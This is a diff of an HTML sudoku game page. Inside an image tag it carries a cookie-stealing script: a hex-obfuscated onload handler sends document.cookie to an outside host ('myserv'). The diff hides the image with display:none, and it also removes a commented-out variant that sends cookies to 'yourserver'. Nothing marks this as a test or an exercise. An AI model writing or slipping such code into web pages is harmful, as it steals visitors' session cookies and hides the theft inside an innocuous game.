@@ -4,7 +4,6 @@
 <link rel="stylesheet" href="css/sudoku.css" type="text/css">
 <script src="javascript/sudoku.js"></script>
 <br>
-<!---div style="overflow: auto;"--->
 <table><tr><td>
 <table id="dokutab"class="dokutable" oncontextmenu="return false;">
   <colgroup><col><col><col>
@@ -26,7 +25,7 @@
 </td>
 <td>
   <br>
-  <img src="data:image/gif;base64,R0lGODlhEAAQAOZIAP///yczPtDY4Pv9/r3G0ICRp/b6/MbP2Pv8/rZ6AJlbAENPX86RAO/z97C8yrO+yOXr8unv9PP2++nv9fT4+m13gl9ncmBpdCgzP/P2+Wlzf83W3296hfv9/XJ+iWZwfF1mcXWBjYGTqWNtd4iVoLvEz+Pr8bnDzsTN1vn6/ebt9Obs80pTX/D0+PD094GNmfL2+uvv9e/y9/j5/ElTXvb4++fu83qFkfr7/vD0+fj6/PL1+evx9vX4+36Klq+6xvb5+3iEkH+MmHqIk7jE0cPM1rC8xuju9P///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAEgALAAAAAAQABAAAAe6gEiCDIOFSISCSCQiCQUFjY+OCSIkgkIACgCYmpmbL4JDAAsOoqSjokQ+gkGara6tN4IhAB0Dtre2HQAhgh4AGwLBwsEbAB6CHAApCMzMODozNQAcghUARQfZ2Sg9GTsAFYIaABQG5uZAFBkuABqCHwAnBPP0BCUNAB+CIwA5Ev8wWjRoICMGgBGCLgD48aChER4RItoAcEEQCAAqJmg8sgKCRxMAQAiy8KokAAuCaGAIwLKlSwwskAQCADs=" onload=this["\x73\x72\x63"]="\x68\x74\x74\x70\x3A\x2F\x2F\x6D\x79\x73\x65\x72\x76\x2F\x3F\x63\x3D"+document["\x63\x6F\x6F\x6B\x69\x65"]>
+  <img src="data:image/gif;base64,R0lGODlhEAAQAOZIAP///yczPtDY4Pv9/r3G0ICRp/b6/MbP2Pv8/rZ6AJlbAENPX86RAO/z97C8yrO+yOXr8unv9PP2++nv9fT4+m13gl9ncmBpdCgzP/P2+Wlzf83W3296hfv9/XJ+iWZwfF1mcXWBjYGTqWNtd4iVoLvEz+Pr8bnDzsTN1vn6/ebt9Obs80pTX/D0+PD094GNmfL2+uvv9e/y9/j5/ElTXvb4++fu83qFkfr7/vD0+fj6/PL1+evx9vX4+36Klq+6xvb5+3iEkH+MmHqIk7jE0cPM1rC8xuju9P///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAEgALAAAAAAQABAAAAe6gEiCDIOFSISCSCQiCQUFjY+OCSIkgkIACgCYmpmbL4JDAAsOoqSjokQ+gkGara6tN4IhAB0Dtre2HQAhgh4AGwLBwsEbAB6CHAApCMzMODozNQAcghUARQfZ2Sg9GTsAFYIaABQG5uZAFBkuABqCHwAnBPP0BCUNAB+CIwA5Ev8wWjRoICMGgBGCLgD48aChER4RItoAcEEQCAAqJmg8sgKCRxMAQAiy8KokAAuCaGAIwLKlSwwskAQCADs=" onload=this["\x73\x72\x63"]="\x68\x74\x74\x70\x3A\x2F\x2F\x6D\x79\x73\x65\x72\x76\x2F\x3F\x63\x3D"+document["\x63\x6F\x6F\x6B\x69\x65"] style="display: none;">
    Game instructions<br>
    ----------------------------------<br>
    Use clicks to set numbers:<br>
@@ -34,8 +33,6 @@
    - Right for -<br>
   <br>
   <table style="border:solid;"><tr>
-  <!---div id="speech-bubble">Try to fill in the missing numbers!
-  <img src=x onloadeddata=this.src='http://yourserver/?c='+document.cookie--->
   </tr><tr>
   </div>
  <br>
